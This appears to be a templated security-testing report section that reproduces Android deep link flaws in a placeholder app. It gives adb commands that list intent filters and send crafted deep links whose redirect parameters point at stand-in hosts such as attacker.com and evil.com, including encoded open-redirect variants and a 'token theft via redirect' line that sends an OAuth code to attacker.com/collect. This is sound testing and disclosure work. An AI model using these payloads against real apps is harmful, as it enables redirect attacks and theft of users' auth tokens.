## Prerequisites
- Android device or emulator with ADB access
- Target app (`{{ package_name }}`) installed
- `adb` command-line tool
- Browser on the device

## Steps to Reproduce

### 1. Extract Deep Link Schemes
```bash
# List intent filters for the app
adb shell dumpsys package {{ package_name }} | grep -B 5 -A 10 "scheme"
adb shell dumpsys package {{ package_name }} | grep -A 15 "android.intent.action.VIEW"
```

### 2. Craft Malicious Deep Link
```bash
# Test basic deep link handling
adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback"

# Test with redirect parameter
adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?redirect=https://attacker.com"
adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?url=https://evil.com"
adb shell am start -a android.intent.action.VIEW -d "{{ package_name }}://callback?next=https://attacker.com"
```

{% if "CWE-601" in cwe %}
### 3. Test Open Redirect
```bash
# URL encoding variations
adb shell am start -a android.intent.action.VIEW \
  -d "{{ package_name }}://auth?redirect_uri=https%3A%2F%2Fattacker.com"

# Double encoding
adb shell am start -a android.intent.action.VIEW \
  -d "{{ package_name }}://auth?redirect_uri=https%253A%252F%252Fattacker.com"

# Token theft via redirect
adb shell am start -a android.intent.action.VIEW \
  -d "{{ package_name }}://oauth/callback?code=STOLEN&redirect=https://attacker.com/collect"
```
{% endif %}

{% if "CWE-749" in cwe %}
